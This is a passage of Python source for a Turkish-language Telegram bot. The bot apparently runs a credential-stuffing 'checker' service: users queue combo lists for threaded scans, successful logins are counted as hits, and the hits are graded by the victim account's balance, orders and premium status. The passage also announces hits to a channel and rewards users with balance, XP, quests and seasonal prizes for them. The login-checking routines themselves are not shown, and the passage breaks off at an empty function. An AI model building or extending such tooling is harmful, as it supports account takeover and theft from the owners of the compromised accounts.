      for cid, claim in list(pending_earn_claims.items()):
        if claim.get("status") != "pending":
          continue
        created = float(claim.get("created", 0) or 0)
        if created and (now - created) >= EARN_AUTO_APPROVE_SEC:
          ok, _ = approve_earn_claim(cid, by_admin=False)
          if ok:
            for admin_id in list(admin_ids_set):
              try:
                bot.send_message(
                  admin_id,
                  f"⏰ Görev otomatik onaylandı (10 dk)\n🆔 Claim `{cid}` user `{claim.get('user_id')}`",
                  parse_mode="Markdown"
                )
              except Exception:
                pass
    except Exception as e:
      try:
        log_error("earn_auto_approve", e)
      except Exception:
        pass
      time.sleep(10)

def add_notification(user_id, text):
  global user_notifications
  if user_id not in user_notifications:
    user_notifications[user_id] = []
  user_notifications[user_id].append({
    "text": text,
    "read": False,
    "time": get_current_time_str()
  })
  user_notifications[user_id] = user_notifications[user_id][-30:]
  save_data()

def add_xp(user_id, amount=10):
  global user_xp, user_level
  user_xp[user_id] = user_xp.get(user_id, 0) + amount
  new_level = 1 + (user_xp[user_id] // 100)
  old_level = user_level.get(user_id, 1)
  user_level[user_id] = new_level
  if new_level > old_level:
    bonus = new_level * 2.0
    user_balances[user_id] = user_balances.get(user_id, 0.0) + bonus
    add_balance_history(user_id, "level_bonus", bonus, f"Level {new_level}")
    add_notification(user_id, f"🎉 Level {new_level}! +{bonus:.0f} TL bonus")
    try:
      bot.send_message(user_id, f"🎉 **Level Atladın!**\n\nSeviye: **{new_level}**\nÖdül: **+{bonus:.0f} TL**", parse_mode="Markdown")
    except:
      pass
  save_data()
  return new_level

def update_quest(user_id, quest_type):
  try:
    bump_activity(user_id, 1)
  except Exception:
    pass
  global daily_quests
  today = datetime.now().strftime("%Y-%m-%d")
  q = daily_quests.get(user_id, {})
  if q.get("date") != today:
    q = {"date": today, "slot": 0, "ilan": 0, "checker": 0, "claimed": False}
  if quest_type not in ("slot", "ilan", "checker"):
    return
  q[quest_type] = int(q.get(quest_type, 0) or 0) + 1
  daily_quests[user_id] = q
  try:
    save_data()
  except Exception:
    pass

def track_checker_use(user_id, n=1):
  """Checker kullanım sayacı + günlük görev."""
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  checker_usage[uid] = int(checker_usage.get(uid, 0) or 0) + int(n)
  update_quest(uid, "checker")
  try:
    add_xp(uid, min(5, max(1, int(n))))
  except Exception:
    pass

def check_quest_complete(user_id):
  today = datetime.now().strftime("%Y-%m-%d")
  q = daily_quests.get(user_id, {})
  if q.get("date") != today or q.get("claimed"):
    return False
  if int(q.get("checker", 0) or 0) >= 3:
    return True
  return int(q.get("slot", 0) or 0) >= 3 and int(q.get("ilan", 0) or 0) >= 1

def claim_quest_reward(user_id):
  if not check_quest_complete(user_id):
    return False, 0
  reward = 10.0
  user_balances[user_id] = user_balances.get(user_id, 0.0) + reward
  daily_quests[user_id]["claimed"] = True
  add_balance_history(user_id, "quest", reward, "Günlük görev")
  add_xp(user_id, 25)
  save_data()
  return True, reward

def format_balance(user_id, amount):
  cur = user_currency.get(user_id, "TL")
  if cur == "USDT":
    return f"{amount/USDT_RATE:.2f} USDT (~{amount:.2f} TL)"
  return f"{amount:.2f} TL"

def do_backup(notify_admins=False):
  import shutil
  os.makedirs(BACKUP_DIR, exist_ok=True)
  if os.path.exists(DB_FILE):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    dest = os.path.join(BACKUP_DIR, f"database_{ts}.json")
    shutil.copy2(DB_FILE, dest)
    files = sorted([f for f in os.listdir(BACKUP_DIR) if f.startswith("database_")])
    for oldf in files[:-10]:
      try:
        os.remove(os.path.join(BACKUP_DIR, oldf))
      except:
        pass
    if notify_admins:
      for admin_id in list(admin_ids_set):
        try:
          with open(dest, "rb") as f:
            bot.send_document(admin_id, f, caption=f"💾 Otomatik yedek: `{os.path.basename(dest)}`", parse_mode="Markdown")
        except Exception:
          try:
            bot.send_message(admin_id, f"💾 Yedek alındı: `{dest}`", parse_mode="Markdown")
          except Exception:
            pass
    return dest
  return None

def _display_name(user_id):
  try:
    creds = user_credentials.get(user_id, {}) or {}
    un = creds.get("reg_username") or creds.get("display_name")
    if un:
      return str(un)
  except Exception:
    pass
  return str(user_id)

def score_hit_quality(detail_text):
  """HIT detay metninden A/B/C kalite. A=yüksek değer, C=zayıf."""
  t = (detail_text or "").lower()
  score = 0
  import re as _re
  m = _re.search(r"(?:bakiye|balance|para|tl|₺|amount)[^\d]{0,12}([0-9]+(?:[.,][0-9]+)?)", t, _re.I)
  if m:
    try:
      val = float(m.group(1).replace(",", "."))
      if val >= 500:
        score += 40
      elif val >= 100:
        score += 25
      elif val >= 20:
        score += 12
      elif val > 0:
        score += 5
    except Exception:
      pass
  m2 = _re.search(r"(?:sipari[sş]|order|orders)[^\d]{0,10}([0-9]+)", t, _re.I)
  if m2:
    try:
      n = int(m2.group(1))
      if n >= 20:
        score += 30
      elif n >= 5:
        score += 18
      elif n >= 1:
        score += 8
    except Exception:
      pass
  if any(k in t for k in ("premium", "vip", "abon", "pro ", "plus", "aktif")):
    score += 15
  if any(k in t for k in ("boş", "bos", "0,00", "0.00", "empty")):
    score -= 5
  if score >= 40:
    return "A", score
  if score >= 15:
    return "B", score
  return "C", score

def grade_hit_lines(lines):
  """Satır listesini kaliteye göre ayır; (graded_lines, counts)."""
  graded = []
  counts = {"A": 0, "B": 0, "C": 0}
  for ln in (lines or []):
    detail = ln
    if " | " in ln:
      detail = ln.split(" | ", 1)[1]
    grade, sc = score_hit_quality(detail)
    counts[grade] = counts.get(grade, 0) + 1
    graded.append(f"[{grade}] {ln}")
  return graded, counts

def notify_hit_channel(user_id, checker_name, hits_count):
  """Kanala sadece bildirim — HIT içeriği GİTMEZ.
  Örn: x kişisi 1x hit çıkardı SMMPANEL
  """
  if not hits_count or int(hits_count) <= 0:
    return
  who = _display_name(user_id)
  name = str(checker_name or "CHECKER").upper().replace(" ", "")
  msg = f"🎯 **{who}** kişisi **{int(hits_count)}x** hit çıkardı **{name}**"
  targets = []
  if HIT_CHANNEL_ID:
    try:
      targets.append(int(HIT_CHANNEL_ID))
    except Exception:
      pass
  if HIT_CHANNEL_USERNAME:
    targets.append(HIT_CHANNEL_USERNAME)
  if CHANNEL_ID:
    try:
      targets.append(int(CHANNEL_ID))
    except Exception:
      pass
  sent = set()
  for t in targets:
    key = str(t)
    if key in sent:
      continue
    sent.add(key)
    try:
      safe_tg(bot.send_message, t, msg, parse_mode="Markdown", retries=1)
      return True
    except Exception:
      try:
        bot.send_message(t, msg.replace("**", ""))
        return True
      except Exception:
        continue
  return False

def build_scan_summary(name, user_id, total, checked, hits_count, bads, errors, workers, elapsed_sec, grade_counts=None, stopped=False):
  """Tarama özeti kartı metni."""
  rate = (100.0 * hits_count / checked) if checked else 0.0
  mins = int(elapsed_sec // 60)
  secs = int(elapsed_sec % 60)
  gtxt = ""
  if grade_counts:
    gtxt = f"\n🏅 Kalite: A **{grade_counts.get('A',0)}** · B **{grade_counts.get('B',0)}** · C **{grade_counts.get('C',0)}**"
  return (
    f"📊 **Tarama Özeti — {name}**\n"
    f"⏱ Süre: **{mins}dk {secs}sn**\n"
    f"📦 Kontrol: **{checked}/{total}**\n"
    f"✅ HIT: **{hits_count}** ({rate:.1f}%)\n"
    f"❌ BAD: **{bads}** · ⚡ ERR: **{errors}**\n"
    f"🧵 Thread: **{workers or '-'}**"
    + gtxt
    + ("\n🛑 Yarıda durduruldu" if stopped else "")
  )

def is_quiet_mode(user_id):
  try:
    return bool(user_quiet_mode.get(int(user_id)))
  except Exception:
    return bool(user_quiet_mode.get(user_id))

def toggle_quiet_mode(user_id):
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  user_quiet_mode[uid] = not bool(user_quiet_mode.get(uid))
  return user_quiet_mode[uid]

def enqueue_checker(user_id, label, combo, run_fn, workers=None):
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  q = list(checker_queues.get(uid) or [])
  if len(q) >= 5:
    return False, "Kuyruk dolu (max 5). Bitmesini bekle."
  q.append({
    "label": str(label),
    "combo": str(combo),
    "run_fn": run_fn,
    "workers": workers or get_checker_workers(uid),
    "ts": time.time(),
  })
  checker_queues[uid] = q
  return True, len(q)

def queue_len(user_id):
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  return len(checker_queues.get(uid) or [])

def _user_has_active_checker(user_id):
  """Herhangi bir active_*_jobs içinde çalışan tarama var mı?"""
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  for k, v in list(globals().items()):
    if not str(k).startswith("active_") or not str(k).endswith("_jobs"):
      continue
    if not isinstance(v, dict):
      continue
    job = v.get(uid)
    if job and not job.get("stop") and not job.get("done"):
      return True
  return False

def process_checker_queue(user_id):
  """Aktif tarama yoksa kuyruktan birini başlat."""
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  if _user_has_active_checker(uid):
    return
  q = list(checker_queues.get(uid) or [])
  if not q:
    return
  item = q.pop(0)
  checker_queues[uid] = q
  run_fn = item.get("run_fn")
  combo = item.get("combo")
  label = item.get("label") or "Checker"
  w = item.get("workers") or get_checker_workers(uid)
  if not callable(run_fn) or not combo:
    return
  set_checker_workers(uid, w)
  try:
    safe_tg(
      bot.send_message,
      uid,
      f"⏳ **Kuyruk:** sıra geldi!\n📄 **{label}** başlıyor...\n⚡ Thread: **{w}**"
      + (f"\n📋 Kalan kuyruk: **{len(q)}**" if q else ""),
      parse_mode="Markdown",
    )
  except Exception:
    pass
  try:
    threading.Thread(target=run_fn, args=(uid, uid, str(combo).strip()), daemon=True).start()
  except Exception:
    try:
      threading.Thread(target=run_fn, args=(uid, uid, str(combo).strip()), daemon=True).start()
    except Exception as e:
      log_error("queue_start", e)

def on_checker_job_finished(user_id):
  """Tarama bitince kuyruğu ilerlet."""
  try:
    process_checker_queue(user_id)
  except Exception as e:
    log_error("queue_next", e)

def season_ensure():
  global season_data
  if not isinstance(season_data, dict):
    season_data = {"active": False, "title": "", "start": 0, "end": 0, "goals": {}, "progress": {}, "claimed": {}, "reward": 100.0}
  return season_data

def season_bump(user_id, hits=0, checks=0, refs=0):
  sd = season_ensure()
  if not sd.get("active"):
    return
  now = time.time()
  if sd.get("end") and now > float(sd["end"]):
    sd["active"] = False
    return
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  prog = dict((sd.get("progress") or {}).get(uid) or {"hits": 0, "checks": 0, "refs": 0})
  prog["hits"] = int(prog.get("hits") or 0) + int(hits or 0)
  prog["checks"] = int(prog.get("checks") or 0) + int(checks or 0)
  prog["refs"] = int(prog.get("refs") or 0) + int(refs or 0)
  if "progress" not in sd or not isinstance(sd["progress"], dict):
    sd["progress"] = {}
  sd["progress"][uid] = prog

def season_status_text(user_id):
  sd = season_ensure()
  if not sd.get("active"):
    return "🍂 Aktif sezon yok.\nAdmin panelden sezon açılabilir."
  goals = sd.get("goals") or {}
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  prog = (sd.get("progress") or {}).get(uid) or {"hits": 0, "checks": 0, "refs": 0}
  left = max(0, float(sd.get("end") or 0) - time.time())
  d = int(left // 86400)
  h = int((left % 86400) // 3600)
  claimed = bool((sd.get("claimed") or {}).get(uid))
  ok_all = (
    int(prog.get("hits") or 0) >= int(goals.get("hits") or 0)
    and int(prog.get("checks") or 0) >= int(goals.get("checks") or 0)
    and int(prog.get("refs") or 0) >= int(goals.get("refs") or 0)
  )
  return (
    f"🗓️ **Sezon:** {sd.get('title') or 'Görev Sezonu'}\n"
    f"⏳ Kalan: **{d}g {h}s**\n"
    f"🎁 Ödül: **{float(sd.get('reward') or 0):.0f} TL**\n\n"
    f"✅ HIT: **{prog.get('hits',0)}/{goals.get('hits',0)}**\n"
    f"🔎 Tarama: **{prog.get('checks',0)}/{goals.get('checks',0)}**\n"
    f"👥 Davet: **{prog.get('refs',0)}/{goals.get('refs',0)}**\n"
    + ("\n🏆 Hedef tamam! Ödülü al." if ok_all and not claimed else "")
    + ("\n✔️ Ödül alındı." if claimed else "")
  )

def season_try_claim(user_id):
  sd = season_ensure()
  if not sd.get("active"):
    return False, "Aktif sezon yok"
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  if (sd.get("claimed") or {}).get(uid):
    return False, "Ödül zaten alındı"
  goals = sd.get("goals") or {}
  prog = (sd.get("progress") or {}).get(uid) or {}
  if int(prog.get("hits") or 0) < int(goals.get("hits") or 0):
    return False, "HIT hedefi eksik"
  if int(prog.get("checks") or 0) < int(goals.get("checks") or 0):
    return False, "Tarama hedefi eksik"
  if int(prog.get("refs") or 0) < int(goals.get("refs") or 0):
    return False, "Davet hedefi eksik"
  reward = float(sd.get("reward") or 0)
  add_norm_bal(uid, reward)
  if "claimed" not in sd:
    sd["claimed"] = {}
  sd["claimed"][uid] = True
  try:
    save_data()
  except Exception:
    pass
  return True, reward

def admin_start_season(title="Görev Sezonu", days=14, hits=50, checks=500, refs=3, reward=100.0):
  global season_data
  now = time.time()
  season_data = {
    "active": True,
    "title": str(title)[:40],
    "start": now,
    "end": now + max(1, int(days)) * 86400,
    "goals": {"hits": int(hits), "checks": int(checks), "refs": int(refs)},
    "progress": {},
    "claimed": {},
    "reward": float(reward),
  }
  try:
    save_data()
  except Exception:
    pass
  return season_data

def bump_suspicion(user_id, points, reason=""):
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  if uid in admin_ids_set:
    return 0
  data = suspicion_scores.get(uid) or {"score": 0, "events": [], "last": 0}
  data["score"] = int(data.get("score") or 0) + int(points)
  ev = list(data.get("events") or [])
  ev.append({"t": get_current_time_str(), "pts": points, "reason": str(reason)[:80]})
  data["events"] = ev[-20:]
  data["last"] = time.time()
  suspicion_scores[uid] = data
  if data["score"] >= SUSPICION_ALERT_THRESHOLD:
    for admin_id in list(admin_ids_set):
      try:
        safe_tg(
          bot.send_message,
          admin_id,
          f"🚨 **Şüphe skoru yüksek**\n👤 `{uid}`\n📊 Skor: **{data['score']}**\n📌 {reason}",
          parse_mode="Markdown",
          retries=1,
        )
      except Exception:
        pass
    data["score"] = max(0, data["score"] - 15)
    suspicion_scores[uid] = data
  return data["score"]

def suspicion_panel_text(limit=15):
  items = sorted(
    ((uid, d.get("score", 0), d) for uid, d in (suspicion_scores or {}).items()),
    key=lambda x: -int(x[1]),
  )[:limit]
  if not items:
    return "🛡 Şüphe listesi boş."
  lines = ["🛡 **Şüphe Skoru Listesi**\n"]
  for uid, sc, d in items:
    last = (d.get("events") or [{}])[-1].get("reason", "-")
    lines.append(f"• `{uid}` → **{sc}** _{last}_")
  return "\n".join(lines)

def referral_tree_text(user_id, depth=2):
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  children = {}
  for invited, ref in (user_referrers or {}).items():
    try:
      inv = int(invited)
      rf = int(ref)
    except Exception:
      continue
    children.setdefault(rf, []).append(inv)
  def _branch(node, level, max_d, acc):
    if level > max_d:
      return
    kids = children.get(node) or []
    pad = "  " * level
    for k in kids[:20]:
      acc.append(f"{pad}├─ `{k}`")
      _branch(k, level + 1, max_d, acc)
  lines = [f"🌳 **Referans ağacın**\n👤 Sen: `{uid}`"]
  kids = children.get(uid) or []
  if not kids:
    lines.append("_Henüz davetin yok._")
  else:
    lines.append(f"📊 Direkt davet: **{len(kids)}**")
    _branch(uid, 1, depth, lines)
    n2 = sum(len(children.get(k) or []) for k in kids)
    lines.append(f"\n📈 2. seviye: **{n2}** kişi")
  return "\n".join(lines)

def list_db_backups(limit=12):
  files = []
  for bdir in (DB_BACKUP_DIR, BACKUP_DIR if "BACKUP_DIR" in globals() else "backups"):
    try:
      if not os.path.isdir(bdir):
        continue
      for name in os.listdir(bdir):
        if name.startswith("database") and name.endswith(".json"):
          fp = os.path.join(bdir, name)
          files.append((os.path.getmtime(fp), fp))
    except Exception:
      pass
  files.sort(reverse=True)
  return [fp for _, fp in files[:limit]]

def restore_db_from_backup(filepath):
  """Seçilen yedeği database.json olarak geri yükle + load_data."""
  global _DB_LOAD_OK
  if not filepath or not os.path.isfile(filepath):
    return False, "Dosya yok"
  try:
    import shutil
    if os.path.exists(DB_FILE):
      ts = time.strftime("%Y%m%d_%H%M%S")
      os.makedirs(DB_BACKUP_DIR, exist_ok=True)
      shutil.copy2(DB_FILE, os.path.join(DB_BACKUP_DIR, f"database_pre_restore_{ts}.json"))
    shutil.copy2(filepath, DB_FILE)
    _DB_LOAD_OK = False
    load_data()
    if _DB_LOAD_OK:
      return True, f"Geri yüklendi: {os.path.basename(filepath)}"
    return False, "Yüklendi ama parse başarısız"
  except Exception as e:
    return False, str(e)[:120]

MAINT_TEMPLATES = {
  "30": {"mins": 30, "msg": "🔧 Kısa bakım (~30 dk). Birazdan açılacağız."},
  "120": {"mins": 120, "msg": "🔧 Bakım (~2 saat). Lütfen sabırla bekleyin."},
  "tomorrow": {"mins": None, "msg": "🔧 Yarın 12:00'ye kadar planlı bakım."},
  "emergency": {"mins": None, "msg": "🚨 Acil bakım. En kısa sürede döneceğiz."},
}

def apply_maint_template(key):
  tpl = MAINT_TEMPLATES.get(str(key))
  if not tpl:
    return False, "Şablon yok"
  global maintenance_message
  maintenance_message = tpl["msg"]
  if tpl.get("mins"):
    set_maintenance_timed(int(tpl["mins"]))
  else:
    set_maintenance(True, until=None)
  try:
    save_data()
  except Exception:
    pass
  return True, maintenance_message

def check_suspicious(user_id, amount, action="transfer"):
  try:
    amount = float(amount or 0)
  except Exception:
    amount = 0.0
  if amount >= 200:
    pts = 8 if amount < 500 else (15 if amount < 2000 else 25)
    try:
      bump_suspicion(user_id, pts, f"{action}:{amount:.0f}")
    except Exception:
      pass
  if amount >= 500:
    for admin_id in admin_ids_set:
      try:
        bot.send_message(admin_id, f"⚠️ **ŞÜPHELİ AKTİVİTE**\n👤 `{user_id}`\n📌 {action}\n💵 {amount:.2f} TL", parse_mode="Markdown")
      except:
        pass
    log_activity("suspicious", user_id, f"{action}:{amount}")

def global_ban_announcement(target_id, reason="kuralları çiğnedi"):
  msg = f"📢 **DİKKAT:** `{target_id}` ID'li kullanıcı {reason} ve sistemden **kalıcı olarak banlandı!** Lütfen kurallara uyun."
  for uid in registered_users:
    try:
      bot.send_message(uid, msg, parse_mode="Markdown")
    except:
      pass

_member_cache = {}  # {(chat_key, user_id): (status, ts)}
_MEMBER_CACHE_TTL = 90  # sn
_membership_bot_warn = {"channel": 0, "chat": 0}  # rate-limit uyarı log

def _membership_targets(chat_id_or_username):
  """Username / id için denenecek hedef listesi."""
  targets = []
  raw = str(chat_id_or_username or "").strip()
  if not raw or raw.lower() in ("none", "null"):
    return targets
  try:
    if raw.lstrip("-").isdigit():
      targets.append(int(raw))
      targets.append(raw)
      return targets
  except Exception:
    pass
  targets.append(raw)
  if raw.startswith("@"):
    targets.append(raw[1:])
  else:
    targets.append("@" + raw)
  seen = set()
  uniq = []
  for t in targets:
    key = str(t)
    if key not in seen:
      seen.add(key)
      uniq.append(t)
  return uniq

def _raw_get_chat_member(chat_id, user_id):
  """telebot başarısız olursa requests ile getChatMember."""
  try:
    r = requests.get(
      f"https://api.telegram.org/bot{TOKEN}/getChatMember",
      params={"chat_id": chat_id, "user_id": int(user_id)},
      timeout=25,
    )
    data = r.json()
    if data.get("ok") and isinstance(data.get("result"), dict):
      return str(data["result"].get("status") or "unknown")
    desc = str(data.get("description") or "")
    low = desc.lower()
    if "user not found" in low or "user_not_found" in low:
      return "left"
    if "not a member" in low or "chat not found" in low:
      return "left"
    if "bot is not a" in low or "not enough rights" in low or "chat_admin_required" in low:
      return "bot_no_rights"
    raise Exception(desc or f"HTTP {r.status_code}")
  except Exception:
    raise

def get_member_status(chat_id_or_username, user_id):
  """Üyelik: member | kicked | left | restricted | administrator | creator | bot_no_rights | unknown"""
  cache_key = (str(chat_id_or_username), int(user_id))
  now = time.time()
  cached = _member_cache.get(cache_key)
  if cached and (now - cached[1]) < _MEMBER_CACHE_TTL:
    return cached[0]

  last_err = None
  bot_rights_issue = False
  for target in _membership_targets(chat_id_or_username):
    for attempt in range(3):
      try:
        member = bot.get_chat_member(target, user_id)
        status = str(getattr(member, "status", "unknown") or "unknown")
        _member_cache[cache_key] = (status, now)
        return status
      except Exception as e:
        last_err = e
        msg = str(e).lower()
        if "too many" in msg or "retry after" in msg or "429" in msg:
          time.sleep(1.5 * (attempt + 1))
          continue
        if "timed out" in msg or "timeout" in msg or "connection" in msg:
          time.sleep(1.0 * (attempt + 1))
          continue
        if any(x in msg for x in (
          "bot is not a member", "not enough rights", "chat_admin_required",
          "need administrator", "bot was kicked", "forbidden",
        )):
          bot_rights_issue = True
          break
        try:
          status = _raw_get_chat_member(target, user_id)
          if status == "bot_no_rights":
            bot_rights_issue = True
            break
          _member_cache[cache_key] = (status, now)
          return status
        except Exception as e2:
          last_err = e2
          break
    if bot_rights_issue:
      break

  if bot_rights_issue:
    if last_err is not None:
      log_error(f"member_status BOT_YETKI_YOK {chat_id_or_username} {user_id}", last_err)
    return "bot_no_rights"
  if last_err is not None:
    log_error(f"member_status {chat_id_or_username} {user_id}", last_err)
  return "unknown"

def is_member_of(chat_id_or_username, user_id):
  status = get_member_status(chat_id_or_username, user_id)
  if status in ("member", "administrator", "creator", "restricted"):
    return True
  return False

def is_kicked_from(chat_id_or_username, user_id):
  return get_member_status(chat_id_or_username, user_id) == "kicked"

def _check_one_membership(user_id, numeric_id, username):
  """Önce numeric ID, sonra username. bot_no_rights / unknown ayrımı döner: (ok, status)"""
  statuses = []
  if numeric_id:
    st = get_member_status(numeric_id, user_id)
    statuses.append(st)
    if st in ("member", "administrator", "creator", "restricted"):
      return True, st
    if st == "kicked":
      return False, st
  if username:
    st = get_member_status(username, user_id)
    statuses.append(st)
    if st in ("member", "administrator", "creator", "restricted"):
      return True, st
    if st == "kicked":
      return False, st
  if any(s == "bot_no_rights" for s in statuses):
    return None, "bot_no_rights"  # None = kontrol edilemedi
  if statuses and all(s == "unknown" for s in statuses):
    return None, "unknown"
  return False, (statuses[-1] if statuses else "left")

def is_channel_member(user_id):
  ok, st = _check_one_membership(user_id, CHANNEL_ID, CHANNEL_USERNAME)
  if ok is True:
    return True
  if ok is None:
    now = time.time()
    if now - _membership_bot_warn.get("channel", 0) > 60:
      _membership_bot_warn["channel"] = now
      log_error(
        "CHANNEL_CHECK_FAIL",
        Exception(
          f"Kanal üyelik kontrolü çalışmıyor (status={st}). "
          f"Botu {CHANNEL_USERNAME} kanalına ADMIN ekle + üye listesi yetkisi ver. "
          f"config.json CHANNEL_ID sayısal (-100...) yaz."
        ),
      )
    return True  # fail-open: katılmış kullanıcıları kilitleme
  return False

def is_chat_member(user_id):
  ok, st = _check_one_membership(user_id, CHAT_ID, CHAT_USERNAME)
  if ok is True:
    return True
  if ok is None:
    now = time.time()
    if now - _membership_bot_warn.get("chat", 0) > 60:
      _membership_bot_warn["chat"] = now
      log_error(
        "CHAT_CHECK_FAIL",
        Exception(
          f"Chat üyelik kontrolü çalışmıyor (status={st}). "
          f"Botu {CHAT_USERNAME} grubuna ADMIN ekle. CHAT_ID={CHAT_ID}"
        ),
      )
    return True  # fail-open
  return False

def is_chat_group_banned(user_id):
  if CHAT_ID and is_kicked_from(CHAT_ID, user_id):
    return True
  if CHAT_USERNAME and is_kicked_from(CHAT_USERNAME, user_id):
    return True
  return False

def is_channel_group_banned(user_id):
  if CHANNEL_ID and is_kicked_from(CHANNEL_ID, user_id):
    return True
  if CHANNEL_USERNAME and is_kicked_from(CHANNEL_USERNAME, user_id):
    return True
  return False

def membership_status(user_id):
  return is_channel_member(user_id), is_chat_member(user_id)

def has_channel_access(user_id):
  if user_id in admin_ids_set:
    return True
  ch_ok, chat_ok = membership_status(user_id)
  return bool(ch_ok and chat_ok)

def clear_member_cache(user_id=None):
  """Kontrol Et basınca taze sorgula."""
  global _member_cache
  if user_id is None:
    _member_cache = {}
    return
  uid = int(user_id)
  for k in list(_member_cache.keys()):
    if k[1] == uid:
      _member_cache.pop(k, None)

def chat_unban_targets():
  targets = []
  if CHAT_ID:
    targets.append(CHAT_ID)
  if CHAT_USERNAME:
    targets.append(CHAT_USERNAME)
  return targets

def try_unban_from_chat(user_id):
  """Bot grupta admin + ban yetkisi olmalı. Returns (ok, detail)."""
  errors = []
  any_ok = False
  for target in chat_unban_targets():
    try:
      try:
        bot.unban_chat_member(target, user_id, only_if_banned=True)
      except TypeError:
        bot.unban_chat_member(target, user_id)
      any_ok = True
    except Exception as e:
      errors.append(f"{target}: {e}")
      log_error(f"unban_chat {target} {user_id}", e)
  if any_ok:
    return True, "Chat banı kaldırıldı"
  return False, ("; ".join(errors) if errors else "Hedef chat yok / yetki yok")

def send_chat_unban_request(user_id, username=None, reason="chat_ban"):
  global chat_unban_requests_sent
  if user_id in chat_unban_requests_sent:
    return False, "❌ Daha önce chat ban kaldırma talebi gönderdiniz. Admin onayı bekleniyor."
  chat_unban_requests_sent.add(int(user_id))
  save_data()
  uname = f"@{username}" if username else str(user_id)
  admin_markup = types.InlineKeyboardMarkup(row_width=2)
  admin_markup.add(
    types.InlineKeyboardButton("✅ Chat Banını Aç", callback_data=f"approve_chat_unban_{user_id}"),
    types.InlineKeyboardButton("❌ Reddet", callback_data=f"reject_chat_unban_{user_id}"),
  )
  admin_text = (
    f"🔓 **CHAT BAN KALDIRMA TALEBİ**\n\n"
    f"👤 {uname}\n"
    f"🆔 `{user_id}`\n"
    f"📌 Kaynak: {reason}\n"
    f"💬 Chat: {CHAT_LINK}\n"
    f"🆔 Grup: `{CHAT_ID}`\n"
    f"🕐 {get_current_time_str()}\n\n"
    f"Onaylarsan bot **Telegram grup banını** otomatik kaldırır "
    f"(bot chat'te yönetici + ban yetkisi olmalı).\n"
    f"Sonra kullanıcı tekrar gruba katılabilir."
  )
  sent = 0
  for admin_id in list(admin_ids_set):
    try:
      bot.send_message(admin_id, admin_text, reply_markup=admin_markup, parse_mode="Markdown")
      sent += 1
    except Exception:
      try:
        bot.send_message(admin_id, admin_text.replace("**", "").replace("`", ""), reply_markup=admin_markup)
        sent += 1
      except Exception:
        pass
  log_activity("chat_unban_request", user_id, reason)
  if sent == 0:
    return True, "⚠️ Talebin kaydedildi ama adminlere iletilemedi. Daha sonra tekrar dene."
  return True, "✅ Chat ban kaldırma talebin adminlere iletildi. Onay gelince otomatik açılacak."

def send_channel_gate(chat_id, user_id):
  """Zorunlu kanal + chat. SADECE ozel sohbete gider (kanal/grup flood engeli)."""
  global channel_gate_last
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  now = time.time()
  if now - float(channel_gate_last.get(uid) or 0) < 90:
    return
  channel_gate_last[uid] = now

  target = chat_id
  try:
    if chat_id is not None:
      cid_int = int(chat_id)
      if cid_int < 0:
        target = uid
      for ref in (CHANNEL_ID, CHAT_ID):
        try:
          if ref is not None and int(ref) == cid_int:
            target = uid
            break
        except Exception:
          pass
  except Exception:
    target = uid

  ch_ok, chat_ok = membership_status(user_id)
  chat_banned = is_chat_group_banned(user_id)
  ch_banned = is_channel_group_banned(user_id)
  ch_mark = "✅" if ch_ok else ("🚫 BANLI" if ch_banned else "❌")
  chat_mark = "✅" if chat_ok else ("🚫 BANLI" if chat_banned else "❌")
  markup = types.InlineKeyboardMarkup(row_width=1)
  if not ch_ok and not ch_banned:
    markup.add(types.InlineKeyboardButton("📢 Kanala Katıl", url=CHANNEL_LINK))
  if not chat_ok and not chat_banned:
    markup.add(types.InlineKeyboardButton("💬 Chat'e Katıl", url=CHAT_LINK))
  if chat_banned or ch_banned:
    markup.add(types.InlineKeyboardButton("🔓 Banımı Aç (Admin Onayı)", callback_data="request_chat_unban"))
  markup.add(types.InlineKeyboardButton("✅ Katıldım / Kontrol Et", callback_data="check_channel_join"))
  ban_note = ""
  if chat_banned or ch_banned:
    ban_note = (
      "\n\n🚫 **Chat/kanalda banlısın.**\n"
      "Gruba katılamıyorsan **Banımı Aç** butonuna bas.\n"
      "Talep adminlere gider; onaylanırsa ban otomatik kalkar.\n"
      "Komut: `/banimiac`"
    )
  text_msg = (
    f"🔒 **Erişim İçin Katılım Zorunlu**\n\n"
    f"Botu kullanmak için **her ikisine de** katılmalısınız:\n\n"
    f"{ch_mark} **Kanal:** {CHANNEL_LINK}\n"
    f"{chat_mark} **Chat:** {CHAT_LINK}\n\n"
    f"1️⃣ Eksik olanlara katıl\n"
    f"2️⃣ **Katıldım / Kontrol Et** butonuna bas\n\n"
    f"🎁 İlk doğrulamada: **+{CHANNEL_BONUS:.0f} TL**"
    f"{ban_note}\n\n"
    f"⚠️ Bot grupta **yönetici** olmalı (üye görme + ban kaldırma)."
  )
  try:
    bot.send_message(target, text_msg, reply_markup=markup, parse_mode="Markdown")
  except Exception:
    try:
      if target != uid:
        bot.send_message(uid, text_msg, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      pass

def try_claim_channel_bonus(user_id, chat_id=None):
  """Kanala katılmışsa bir kez CHANNEL_BONUS TL verir."""
  if user_id in channel_bonus_claimed:
    return False, "already"
  if not is_channel_member(user_id):
    return False, "not_member"
  channel_bonus_claimed.add(user_id)
  user_balances[user_id] = user_balances.get(user_id, 0.0) + CHANNEL_BONUS
  add_balance_history(user_id, "channel_bonus", CHANNEL_BONUS, CHANNEL_USERNAME)
  add_notification(user_id, f"+{CHANNEL_BONUS:.0f} TL kanal katılım ödülü")
  grant_achievement(user_id, "channel_join")
  log_activity("channel_bonus", user_id, CHANNEL_BONUS)
  save_data()
  if chat_id:
    try:
      bot.send_message(
        chat_id,
        f"🎉 **Kanal Ödülü!**\n\n{CHANNEL_LINK} kanalına katıldığınız için **+{CHANNEL_BONUS:.0f} TL** bakiyenize eklendi.\n💳 Bakiye: **{user_balances[user_id]:.2f} TL**",
        parse_mode="Markdown"
      )
    except:
      pass
  return True, CHANNEL_BONUS

def update_login_streak(user_id):
